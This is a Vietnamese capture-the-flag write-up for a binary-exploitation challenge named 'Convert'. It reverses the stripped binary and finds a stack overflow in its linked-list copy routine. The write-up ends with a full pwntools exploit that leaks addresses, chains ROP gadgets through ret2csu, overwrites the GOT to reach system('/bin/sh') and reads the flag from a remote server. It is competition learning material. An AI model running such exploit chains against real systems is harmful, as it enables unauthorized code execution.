# Convert

Đây là challenge mình nghĩ là khó nhất trong kì thi vừa rồi, nhưng challenge này vẫn thuộc dạng cổ điển nên mình rất quen thuộc vẫn nó.

## Checksec

![image](https://user-images.githubusercontent.com/57558487/196619533-71974bb0-2f3c-48ff-aad4-ac215f78a445.png)

Chương trình bậc PIE, không có canary và RELRO

## Reverse

Binary này đã bị strip nên cần bỏ một chút thời gian để reverse và rename lại các hàm.

### Hàm `main`

```c
__int64 __fastcall main(__int64 a1, char **a2, char **a3)
{
  char s[60]; // [rsp+10h] [rbp-50h] BYREF
  int v5; // [rsp+4Ch] [rbp-14h]
  void *v6; // [rsp+50h] [rbp-10h]
  int v7; // [rsp+5Ch] [rbp-4h]

  init_setup();
  puts("Welcome to the convert server!");
  do
  {
    memset(s, 0, 0x38uLL);
    v7 = read(0, s, 0x38uLL);
    if ( v7 < 0 )
      exit(1);
    if ( s[v7 - 1] == 10 )
      s[v7 - 1] = 0;
    v6 = malloc(0x18uLL);
    make_struct(v6, s);
    v5 = run(v6);
    if ( v5 == -1 )
      exit(1);
  }
  while ( v5 );
  puts("Done");
  return 0LL;
}
```

Nhìn sơ về hàm main, đầu tiên gọi `init_setup()` để `setbuf` cho các stream và in cho ta địa chỉ return address của hàm `init_setup` nằm ở offset 0x1ada với elf address -> PIE leak, sau đó tiến hành một vòng lặp, ở mỗi vòng lặp, biến `s` được clear và được đọc vào 0x38 byte, sau đó `make_struct` được gọi để chuyển hóa input từ biến `s` trên stack lên một struct 0x18 byte trên heap. Cuối cùng là gọi `run()` với struct heap được tạo.

### Hàm `make_struct`

```c
__int64 __fastcall sub_1242(__int64 a1, __int64 a2)
{
  __int64 result; // rax

  *(_DWORD *)a1 = atoi((const char *)a2);
  *(_DWORD *)(a1 + 4) = *(_DWORD *)(a2 + 4);
  *(_QWORD *)(a1 + 8) = malloc(0x30uLL);
  memcpy(*(void **)(a1 + 8), (const void *)(a2 + 8), 0x30uLL);
  result = a1;
  *(_QWORD *)(a1 + 16) = 0LL;
  return result;
}
```

Hàm này cơ chế hoạt động đơn giản, 4 byte đầu của input được chuyển thành số và store vào 4 byte đầu của struct, 4 byte tiếp theo map vào 4 byte tiếp theo của struct, cuối cùng 0x30 byte còn lại được memcpy vào một struct 0x30 được malloc trên heap.

Đến đây thì sẽ hơi khó hiểu cho người, dựa theo tính năng của chương trình đại loại là struct này mình sẽ mô hình hóa lại tương tự như sau:

```c
struct note {
  int action;
  char[4] type_convert;
  char* data;
  struct note* next;
};
```

Chương trình sẽ có 2 loại convert là `hex_to_byte` và `byte_to_hex`, chúng ta sẽ có 2 action, 0 tức là thêm vào buffer hiện tại, 1 là kết thúc chuỗi và tiến hành convert. Có 2 loại convert và việc chọn loại convert nào sẽ dựa trên 4 kí tự nằm trong `type_convert`, gồm 2 loại là `htb` và `bth`, cuối cùng là pointer đến mảng 0x30 chứa data cần convert. Cuối cùng là 1 pointer trỏ đến `struct note` tiếp theo hoạt động giống như một `linked_list`.

### Hàm `run`

```c
__int64 __fastcall run(__int64 a1)
{
  if ( !*(_BYTE *)(a1 + 4) )
    goto LABEL_2;
  if ( !strcmp((const char *)(a1 + 4), "htb") )
    return (unsigned int)htb(a1);
  if ( strcmp((const char *)(a1 + 4), "bth") )
  {
LABEL_2:
    puts("What do you want to do?");
    return 0xFFFFFFFFLL;
  }
  return (unsigned int)bth(a1);
}
```

Hàm này tiến hành dựa vào `type_convert` để gọi hàm thích hợp, mình khá khó chịu vì cơ chế `strcmp` mà chuỗi lại đọc vào ở hàm `read`, vì thế khi mình chạy thử ban đầu không bao giờ có thể compare đúng chuỗi `htb` hoặc `bth`, vì chúng ta không thể send NULL byte qua bàn phím được.

### Hàm `htb`

```c
__int64 __fastcall htb(__int64 a1, __int64 a2)
{
  size_t v3; // rax
  size_t v4; // rbx
  char v5[8]; // [rsp+10h] [rbp-2A0h] BYREF
  __int64 v6; // [rsp+18h] [rbp-298h]
  char v7[464]; // [rsp+20h] [rbp-290h] BYREF
  char s[120]; // [rsp+1F0h] [rbp-C0h] BYREF
  int v9; // [rsp+268h] [rbp-48h]
  int v10; // [rsp+26Ch] [rbp-44h]
  int k; // [rsp+270h] [rbp-40h]
  unsigned int v12; // [rsp+274h] [rbp-3Ch]
  __int64 j; // [rsp+278h] [rbp-38h]
  int v14; // [rsp+284h] [rbp-2Ch]
  __int64 i; // [rsp+288h] [rbp-28h]
  int v16; // [rsp+294h] [rbp-1Ch]
  int v17; // [rsp+298h] [rbp-18h]
  unsigned int v18; // [rsp+29Ch] [rbp-14h]

  *(_QWORD *)v5 = 0LL;
  v6 = 0LL;
  memset(v7, 0, sizeof(v7));
  v18 = sub_12BC(a1, a2, v7);
  if ( v18 == -1 )
  {
    puts("wrong type");
    return v18;
  }
  if ( *(_DWORD *)a1 == 1 )
  {
    if ( unk_4080 )
    {
      if ( !strcmp((const char *)(unk_4080 + 4LL), (const char *)(a1 + 4)) )
      {
        for ( i = unk_4080; *(_QWORD *)(i + 16); i = *(_QWORD *)(i + 16) )
          ;
        *(_QWORD *)(i + 16) = a1;
      }
    }
    else
    {
      unk_4080 = a1;
    }
    v18 = 1;
  }
  else
  {
    if ( *(_DWORD *)a1 )
    {
      puts("What do you want to do?");
      return 0xFFFFFFFFLL;
    }
    v14 = 0;
    if ( unk_4080 && !strcmp((const char *)(unk_4080 + 4LL), (const char *)(a1 + 4)) )
    {
      for ( j = unk_4080; **(_DWORD **)(j + 8); j = *(_QWORD *)(j + 16) )
      {
        memcpy(&s[v14], *(const void **)(j + 8), 0x30uLL);
        v14 += 48;
        if ( !*(_QWORD *)(j + 16) )
          goto LABEL_20;
      }
      puts("Buffer must not be empty.");
    }
LABEL_20:
    v3 = strlen(*(const char **)(a1 + 8));
    memcpy(&s[v14], *(const void **)(a1 + 8), v3);
    v12 = 0;
    for ( k = 0; v12 <= 0x1DF; ++k )
    {
      v4 = k;
      if ( v4 >= strlen(s) )
        break;
      v16 = 3;
      if ( s[k] <= 47 || s[k] > 57 )
      {
        if ( s[k] > 96 && s[k] <= 102 )
          v17 = s[k] - 87;
      }
      else
      {
        v17 = s[k] - 48;
      }
      while ( v16 >= 0 )
      {
        v10 = v17 / 2;
        v9 = v17 % 2;
        v17 /= 2;
        v5[v12 + v16--] = v9 + 48;
      }
      v12 += 4;
    }
    v18 = 0;
    puts(v5);
  }
  return v18;
}
```

Okey, hàm này và hàm `bth` là 2 hàm chính của chương trình, vì thế mình cần reverse kĩ 2 hàm này. 2 hàm này có cơ chê hoạt động tương tự nhau. Chương trình cũng không quá khó để reverse vì nó khá ngắn. Cuối giải mình có hỏi thằng em thì nó bảo nó reverse không nổi :))). Hơi xui cho em nó :)))

Mình sẽ tóm tắt cơ chế hàm này như sau: đầu tiên hàm sẽ check xem `data` có hợp lệ hay không, trong trường hợp hàm `htb` thì `data` yêu cầu là chữ thường `a`->`f` và số `0` -> `9`, hàm dựa vào biến `action` để hoạt động, nếu `action == 0`, chương trình sẽ append struct vào cuối linked list tại `unk_4080`. Nếu `action == 1`, chương trình đầu tiên copy toàn bộ `data` từ linkedlist lên stack, sau đó áp dụng một loạt các biến đổi và cuối cùng in ra chuỗi sau khi convert.

### Hàm `bth`

```c
__int64 __fastcall bth(__int64 a1)
{
  size_t v2; // rax
  size_t v3; // rbx
  char v4[8]; // [rsp+10h] [rbp-E0h] BYREF
  __int64 v5; // [rsp+18h] [rbp-D8h]
  __int64 v6; // [rsp+20h] [rbp-D0h]
  int v7; // [rsp+28h] [rbp-C8h]
  __int16 v8; // [rsp+2Ch] [rbp-C4h]
  char s[128]; // [rsp+30h] [rbp-C0h] BYREF
  int v10; // [rsp+B0h] [rbp-40h]
  int v11; // [rsp+B4h] [rbp-3Ch]
  unsigned int l; // [rsp+B8h] [rbp-38h]
  int v13; // [rsp+BCh] [rbp-34h]
  __int64 k; // [rsp+C0h] [rbp-30h]
  int v15; // [rsp+CCh] [rbp-24h]
  __int64 j; // [rsp+D0h] [rbp-20h]
  int i; // [rsp+D8h] [rbp-18h]
  unsigned int v18; // [rsp+DCh] [rbp-14h]

  *(_QWORD *)v4 = 0LL;
  v5 = 0LL;
  v6 = 0LL;
  v7 = 0;
  v8 = 0;
  v11 = strlen(*(const char **)(a1 + 8));
  for ( i = 0; i < v11; ++i )
  {
    if ( *(char *)(*(_QWORD *)(a1 + 8) + i) <= 47 || *(char *)(*(_QWORD *)(a1 + 8) + i) > 49 )
    {
      puts("wrong type");
      return 0xFFFFFFFFLL;
    }
  }
  if ( *(_DWORD *)a1 == 1 )
  {
    if ( unk_4080 )
    {
      if ( !strcmp((const char *)(unk_4080 + 4LL), (const char *)(a1 + 4)) )
      {
        for ( j = unk_4080; *(_QWORD *)(j + 16); j = *(_QWORD *)(j + 16) )
          ;
        *(_QWORD *)(j + 16) = a1;
      }
    }
    else
    {
      unk_4080 = a1;
    }
    v18 = 1;
  }
  else
  {
    if ( *(_DWORD *)a1 )
    {
      puts("What do you want to do?");
      return 0xFFFFFFFFLL;
    }
    v15 = 0;
    if ( unk_4080 && !strcmp((const char *)(unk_4080 + 4LL), (const char *)(a1 + 4)) )
    {
      for ( k = unk_4080; **(_DWORD **)(k + 8); k = *(_QWORD *)(k + 16) )
      {
        memcpy(&s[v15], *(const void **)(k + 8), 0x30uLL);
        v15 += 48;
        if ( !*(_QWORD *)(k + 16) )
          goto LABEL_24;
      }
      puts("Buffer must not be empty.");
    }
LABEL_24:
    v2 = strlen(*(const char **)(a1 + 8));
    memcpy(&s[v15], *(const void **)(a1 + 8), v2);
    v13 = 0;
    for ( l = 0; l <= 0x1D; ++l )
    {
      v3 = v13;
      if ( v3 >= strlen(s) )
        break;
      v10 = 2 * (2 * (2 * (s[v13] - 48) + s[v13 + 1] - 48) + s[v13 + 2] - 48) + s[v13] - 48;
      if ( v10 > 9 )
        v4[l] = v10 + 87;
      else
        v4[l] = v10 + 48;
      v13 += 4;
    }
    puts(v4);
    v18 = 0;
  }
  return v18;
}
```

Hàm này tương tự hàm `htb`, khác ở chỗ kiểm tra `data` đầu vào và xử lí khúc cuối để in ra giá trị convert.

## Thinking

Ban đầu reverse xong mình dễ dàng nhận ra lỗi buffer overflow ở cả 2 hàm là `bth` và `htb`.

```c
if ( unk_4080 && !strcmp((const char *)(unk_4080 + 4LL), (const char *)(a1 + 4)) )
    {
      for ( k = unk_4080; **(_DWORD **)(k + 8); k = *(_QWORD *)(k + 16) )
      {
        memcpy(&s[v15], *(const void **)(k + 8), 0x30uLL);
        v15 += 48;
        if ( !*(_QWORD *)(k + 16) )
          goto LABEL_24;
      }
      puts("Buffer must not be empty.");
    }
```

Đoạn code parse toàn bộ data từ linked list vào stack không hề check độ dài của mảng, cứ mỗi vòng lặp copy 0x30 byte lên stack và cộng biến v15 lên, dẫn đến stack overflow. Chương trình không có `canary`, cộng thêm việc đã leak được `PIE` trước đó, tấn công là khá dễ dàng.

Tiếp đến ta cần nhìn sơ qua về cơ chế kiểm tra `data` hợp lệ, cơ chế này dựa trên hàm `strlen` (dừng ở nullbyte) nhưng khi dùng lại gọi đến `memcpy` (copy cả nullbyte), vì thế ta có thể dễ dàng bypass nếu ta kết thúc chuỗi sớm bằng '\x00', lúc này ta có thể điền các byte khác không hợp lệ vào vùng `data` sau đó nó được copy sang stack bằng `memcpy`

Tuy nhiên mình ngay lập tức nhận ra vấn đề, đó là khi ta overflow, ta sẽ đè qua biến `k` dùng cho vòng lặp, từ đó flow chương trình sẽ thay đổi, ta cần bypass nó, một cách đơn giản đó là đè lại biến `k` thành (elf.address + 0x4070), khí đó `k->next` sẽ trở về struct ban đầu của ta và tiến hành loop tiếp đến khi dừng.

Bài này là bài mình tốn thời gian lâu nhất trong khi giải (chắc tầm 3 tiếng) và sau đó vì submit quá trễ mà team mình đã đứng sau trường Duy Tân mặc dù cùng điểm, đó là điều mình khá buồn vì bài này không khó đến vậy. Đó là do một lỗi cực ngớ ngẫn của mình, mặc dù có bug giống nhau nhưng hàm `htb` lại cực kì dễ khai thác còn `bth` thì lại cực kì khó, lí do như sau:

Đây là vị trí các variable trên stack của hàm `htb`, và `bth`

`htb`

```c
  size_t v3; // rax
  size_t v4; // rbx
  char v5[8]; // [rsp+10h] [rbp-2A0h] BYREF
  __int64 v6; // [rsp+18h] [rbp-298h]
  char v7[464]; // [rsp+20h] [rbp-290h] BYREF
  char s[120]; // [rsp+1F0h] [rbp-C0h] BYREF
  int v9; // [rsp+268h] [rbp-48h]
  int v10; // [rsp+26Ch] [rbp-44h]
  int k; // [rsp+270h] [rbp-40h]
  unsigned int v12; // [rsp+274h] [rbp-3Ch]
  __int64 j; // [rsp+278h] [rbp-38h]
  int v14; // [rsp+284h] [rbp-2Ch]
  __int64 i; // [rsp+288h] [rbp-28h]
  int v16; // [rsp+294h] [rbp-1Ch]
  int v17; // [rsp+298h] [rbp-18h]
  unsigned int v18; // [rsp+29Ch] [rbp-14h]
```

`bth`

```c
  size_t v2; // rax
  size_t v3; // rbx
  char v4[8]; // [rsp+10h] [rbp-E0h] BYREF
  __int64 v5; // [rsp+18h] [rbp-D8h]
  __int64 v6; // [rsp+20h] [rbp-D0h]
  int v7; // [rsp+28h] [rbp-C8h]
  __int16 v8; // [rsp+2Ch] [rbp-C4h]
  char s[128]; // [rsp+30h] [rbp-C0h] BYREF
  int v10; // [rsp+B0h] [rbp-40h]
  int v11; // [rsp+B4h] [rbp-3Ch]
  unsigned int l; // [rsp+B8h] [rbp-38h]
  int v13; // [rsp+BCh] [rbp-34h]
  __int64 k; // [rsp+C0h] [rbp-30h]
  int v15; // [rsp+CCh] [rbp-24h]
  __int64 j; // [rsp+D0h] [rbp-20h]
  int i; // [rsp+D8h] [rbp-18h]
  unsigned int v18; // [rsp+DCh] [rbp-14h]
```

## Exploit

```python
#
#	***************************
#	* Pwning exploit template *
#	* Arthor: Cobra           *
#	***************************
#

from pwn import *
import sys

import time

local = 0
debug = 0

context.arch = 'amd64'
# context.aslr = False
# context.log_level = 'debug'
# context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']
# context.timeout = 2

def conn():
	global local
	global debug

	for arg in sys.argv[1:]:
		if arg in ('-h', '--help'):
			print('Usage: python ' + sys.argv[0] + ' <option> ...')
			print('Option:')
			print('        -h, --help:     Show help')
			print('        -l, --local:    Running on local')
			print('        -d, --debug:    Use gdb auto attach')
			exit(0)
		if arg in ('-l', '--local'):
			local = 1
		if arg in ('-d', '--debug'):
			debug = 1

	if local:
		s = process('./convert_patched')
		if debug:
			gdb.attach(s, gdbscript='''
				# brva 0x180A
				# brva 0x16AB
				# brva 0x1A18
				# brva 0x16a9
				brva 0x1469
			''' + 'c\n' * 1)
		else:
			raw_input('DEBUG')
	else:
		s = remote('34.143.130.87', 4001)

	return s

s = conn()

elf = ELF('convert')
libc = ELF('libc-2.23.so')

s.recvuntil(b'I have some gift for you ^^\n')
elf.address = int.from_bytes(s.recvline()[:-1], byteorder = 'little', signed = False) - 0x1ada

rop = ROP(elf)

pop_rdi = rop.find_gadget(['pop rdi', 'ret']).address
ret = rop.find_gadget(['ret']).address
pop_rsi_r15 = rop.find_gadget(['pop rsi', 'pop r15', 'ret']).address
main = elf.address + 0x1ac1
csu1 = elf.address + 0x1C02
csu2 = elf.address + 0x1be8

log.info('PIE base: 0x%x', elf.address)
log.info('Break at: 0x%x', csu1)

time.sleep(0.1)
payload = b'\x00' + b'a' * 3 + p32(0x90) + p64(0) * 5
s.send(b'1   htb\x00' + payload)

time.sleep(0.1)
payload = b'\x00' + b'a' * 7 + p64(ret)
payload += p64(pop_rdi) + p64(elf.got['puts'])
payload += p64(elf.symbols['puts']) + p64(pop_rdi)
s.send(b'1   htb\x00' + payload)

# raw_input('DEBUG')
# payload = b'\x00' + b'a' * 7 + p64(0)
# payload += p64(1) + p64(0)
# payload += p64(elf.got['exit']) + p64(0x20)
# s.send(b'1   htb\x00' + payload)

time.sleep(0.1)
payload = b'\x00' + b'a' * 7 + p64(pop_rsi_r15)
payload += p64(0) * 2
payload += p64(pop_rsi_r15) + p64(elf.address + 0x4070)
s.send(b'1   htb\x00' + payload)

time.sleep(0.1)
payload = b'\x00' + b'a' * 7 + p64(csu1)
payload += p64(0) + p64(1)
payload += p64(0) + p64(elf.got['malloc'])
s.send(b'1   htb\x00' + payload)

time.sleep(0.1)
payload = p64(0x100) + p64(elf.got['read'])
payload += p64(ret) + p64(csu2)
payload += p64(0) + p64(0)
s.send(b'1   htb\x00' + payload)

# print('check')

time.sleep(0.1)
payload = b'\x00' + b'a' * 7 + p64(1)
payload += p64(0) + p64(0)
payload += p64(0) + p64(pop_rdi)
s.send(b'1   htb\x00' + payload)

time.sleep(0.1)
payload = b'\x00' + b'a' * 7 + p64(ret)
payload += p64(pop_rdi) + p64(elf.got['malloc'])
payload += p64(elf.symbols['atoi']) + p64(0)
s.send(b'1   htb\x00' + payload)

time.sleep(0.1)
payload = b'\x00' + b'a' * 7 + p64(0) * 5
s.send(b'0   htb\x00' + payload)

print(s.recvuntil(b'Welcome to the convert server!'))
s.recvline()
s.recvline()

libc.address = int.from_bytes(s.recv(6), byteorder = 'little', signed = False) - libc.symbols['puts']
log.info('Libc base: 0x%x', libc.address)

s.sendline(b'/bin/sh\x00' + p64(libc.symbols['system']))

time.sleep(0.1)
s.sendline(b'cat /home/ctf/flag')

s.interactive()
```

Flag: `ASCIS{buff3r_m0r3_4nd_m0r3}`




